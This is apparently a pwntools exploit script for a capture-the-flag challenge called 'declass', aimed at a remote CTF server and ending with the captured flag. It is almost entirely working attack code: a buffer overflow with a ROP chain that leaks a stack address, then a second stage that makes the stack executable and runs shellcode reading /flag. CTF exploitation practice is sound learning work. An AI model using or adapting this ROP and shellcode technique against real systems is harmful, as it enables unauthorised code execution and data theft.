#!/usr/bin/env python3
from pwn import *

context.terminal = ["/usr/bin/kitty"]
context.encoding = 'latin'
context.log_level = "critical"

context.binary = elf = ELF("./declass", checksec=False)
# context.binary = elf = ELF("./src/redis-lite-server", checksec=False)
# libc = ELF("./libc.so.6")

gs = """
b main
c
"""

HOST, PORT = "a79694516bd5cf79.declassifier.flu.xxx", 443
# HOST, PORT = "34.170.146.252", 11192

p = remote(HOST, PORT, ssl=True)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gs)

# 0x000000000040422e : pop rdi ; pop rbp ; ret
pop_rdi_rbp = 0x000000000040422e
ret = 0x00000000004032f1

payload = flat(
    'flux' * 0x35,
    "aaaaaa",

    pop_rdi_rbp,
    elf.sym['environ'],
    0xdead,
    elf.sym['printf'],
    ret,
    elf.sym['main'],
)
print(f"len(payload) = {len(payload)}")

p.send(payload)

p.recvuntil(b'aaaaaa')
p.recv(3)
environ = unpack(p.recv(6), 'all')
print(f"stack: {hex(environ)}")

# cour 2
payload = flat(
    'flux' * 0x35,
    "aaaaaa",

    pop_rdi_rbp,
    environ,
    0xdead,
    elf.sym['_dl_make_stack_executable'],
    environ-0xe8,
    asm(shellcraft.cat('/flag'))
)
print(f"len(payload) = {len(payload)}")

p.send(payload)

p.recvuntil(b'aaaaaa')
p.recv(3)

p.interactive()
# flag{00p5-57r1ng_r3pl4c3m3n7_w17h0u7_4dju571ng_57r1ng_l3ng7h_15_4_b4d_1d34:4a268238569948a2720ae02479ae77d2}
# I've seen this challenge somewhere before, maybe livectf
